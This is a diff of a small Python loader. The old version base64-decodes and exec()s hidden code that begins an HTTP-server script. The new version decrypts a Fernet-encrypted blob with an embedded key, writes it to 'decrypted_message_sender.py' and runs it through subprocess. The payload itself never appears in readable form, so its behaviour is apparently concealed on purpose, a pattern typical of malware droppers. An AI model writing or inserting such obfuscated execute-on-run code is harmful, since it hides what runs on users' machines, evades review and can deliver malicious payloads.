@@ -1,11 +1,25 @@
-#incoded by devil
+
 import base64
+from cryptography.fernet import Fernet
+import subprocess
 
-# The Base64 encoded string
-encoded_string = 'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IGh0dHBfc2VydmVyCmltcG9ydCBzb2NrZXRzZXJ2ZXIKCmNsYXNzIE15SGFuZGxlciBodHRwLnNlcnZlci5TaW1wbGU='
+# Decryption key (make sure to use the provided encryption key)
+decryption_key = b'sjlWW7G62TALkU5ElEPrOZY4Qzqa_nwVmBWgCwdlYMc='
 
-# Decode the string
-decoded_code = base64.b64decode(encoded_string).decode('utf-8')
+# The encrypted script (as a string)
+encrypted_script = b'gAAAAABlaBzVZdvzpSj4VPg7YgoZ8RsbfZp3V6TXRfFoU16iwslFfsGGBeHiGoHdV6EHytnanBnn1DFRVxv3cw5NtdqsbmHmDXI7NRG_tKa2SQU0oWUEGX8XUUTuUTmiD5uIYPZMyZyOebN4A4_s4VCxbmB4LbXazYKhHtSX5P2ZfX4MAfH5ljJAgAjRaNCoZnmeHDbDch3a0u0e98-EL7Zf5PBOqYrQhhMzHUZIvDPjqAwL1mR0hApWxORAxHeFOi6JWsGEd7QOolwQmOwAOjHBk6kACARBYdZPg29wiMlIuRBltLSEbF-nBMvcl8xxP1UpeTyAoS4PbCBX4uWeOAM3DNJDr63HwYZOG8VG9HLJthXxCHae7xN4BWze-D2hzxr4zSG59XpOqGIG-vLV_E-NSQgDLvgrvC2b34J7RxujajLUFGXNlJwISVmuXXcvDV8VoqUzv57xngLDkKnMzYIKvWMOHTZneV61XqbGDvQp-9ARnY9geFGtZoA1WsovNkWrmGvFcAJzZZmIQ2yBBfX8DMwDxkG8vLsOghh_dkFcFKWSJmczLGWqFvRF8fnnl9cx_hDLGBLtw6sYyei85Z1TANmt45vYvYZMmgc5uVvEkJtm7vlD9a3dIFNbWw5BlsoXkGFfR3krKhEGcD_Ro-J_s6DkHRakEMi6PAaCPxS-kg9oxDwpRiC2vEPL9fFr4YXfJ8U59lBGGyYrHgpbSoPBwUdWIbFLw0TL_9GoZBzMQmAuVpIKrfxCx5NbBXvo7W_XtOse3ZphLhIQRAuh4BRgvfEj8XHX7A4LOaJ1mYs8xfTuE-Kadgx4-xcCrQqWswDk5AiMtwGYdbDA5kpNpq-XPZQ5-l3nrkFbRGfAOHPS_NtfsycLR2OkggVi6BPq22cGGJomPMY-JKlRiV4Xr96TdMtURTY1D5CRcTZCpmP8SX3cbvgv_1dsvshAB-ikPmqGHUEEtZ69_jSYVFkN1cUgR_DERw1uFWVFCiNC41mkwNJYUPbDn0NQe5kzEt58ftTfc5OnTXDceTFLa1Elw=='
 
-# Execute the decoded code
-exec(decoded_code)
+# Function to decrypt the encrypted script
+def decrypt_script(encrypted_script, key):
+    fernet = Fernet(key)
+    return fernet.decrypt(encrypted_script).decode()
+
+# Decrypt the script
+decrypted_script = decrypt_script(encrypted_script, decryption_key)
+
+# Save the decrypted script to a temporary file
+with open("decrypted_message_sender.py", "w") as f:
+    f.write(decrypted_script)
+
+# Run the decrypted script
+subprocess.run(["python3", "decrypted_message_sender.py"])
